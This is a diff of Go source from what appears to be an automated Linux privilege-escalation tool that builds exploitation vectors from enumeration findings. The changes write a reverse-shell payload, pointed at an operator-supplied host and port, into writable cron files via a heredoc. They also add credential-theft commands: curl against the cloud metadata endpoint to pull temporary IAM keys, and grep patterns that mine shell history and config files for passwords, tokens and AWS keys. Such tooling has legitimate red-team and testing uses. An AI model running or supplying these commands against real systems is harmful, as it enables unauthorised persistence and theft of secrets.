@@ -222,9 +222,13 @@ func enumerateSUDO(p *AutoPrivilege, f Finding) {
 }
 
 // --- Cron enumeration ---
+// The displayed command uses a quoted heredoc: the payload itself contains
+// single quotes (bash -c '...'), so an `echo '<payload>'` line broke the
+// moment an operator copy-pasted it into a shell.
 func enumerateCRON(p *AutoPrivilege, f Finding) {
-	addVector(p, "cron "+f.Target, "cron", f.Target,
-		fmt.Sprintf("echo '%s' >> %s", cronPayload(p.Opts.LHost, p.Opts.LPort, f.Target), f.Target), RiskHigh,
+	payload := cronPayload(p.Opts.LHost, p.Opts.LPort, f.Target)
+	cmd := fmt.Sprintf("cat >> %s <<'AUTOPRIV_EOF'\n%s\nAUTOPRIV_EOF", f.Target, payload)
+	addVector(p, "cron "+f.Target, "cron", f.Target, cmd, RiskHigh,
 		func() *ExploitResult {
 			return exploitCron(f.Target, p.Opts)
 		},
@@ -308,11 +312,32 @@ func enumerateKernelCVE(p *AutoPrivilege, f Finding) {
 }
 
 // --- Credential enumeration ---
+// Every exploitable CRED finding gets a vector: SSH keys as before, plus
+// cloud metadata, shell history and credential-bearing configs as manual
+// techniques, so the dry-run plan and the report no longer drop them.
 func enumerateCredential(p *AutoPrivilege, f Finding) {
 	if isSSHPrivateKey(f.Target) {
 		addManualVector(p, "ssh-key "+filepath.Base(f.Target), "cred", f.Target,
 			fmt.Sprintf("ssh -i %s <user>@<host>", f.Target), RiskHigh,
 			map[string]string{"type": "ssh-private-key"})
+		return
+	}
+	switch {
+	case strings.HasPrefix(f.Target, "http://169.254.169.254"):
+		addManualVector(p, "cloud-metadata "+f.Target, "cred", f.Target,
+			fmt.Sprintf("curl -fsS '%s'   # then walk role-name → security-credentials/ for temp IAM keys", f.Target),
+			RiskHigh,
+			map[string]string{"type": "cloud-metadata", "note": "IMDSv2 hosts require a token header: -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'"})
+	case strings.HasPrefix(f.Description, "History file"):
+		addManualVector(p, "history "+filepath.Base(f.Target), "cred", f.Target,
+			fmt.Sprintf("grep -inE 'password|passwd|secret|token|api_key|aws_|AKIA' %s   # review the hits before reusing anything", f.Target),
+			RiskHigh,
+			map[string]string{"type": "shell-history"})
+	default:
+		addManualVector(p, "creds "+filepath.Base(f.Target), "cred", f.Target,
+			fmt.Sprintf("grep -inE 'password|passw|psk|requirepass|api[_-]?key' %s   # extract, then rotate any secret found", f.Target),
+			RiskMedium,
+			map[string]string{"type": "config-credentials"})
 	}
 }
 
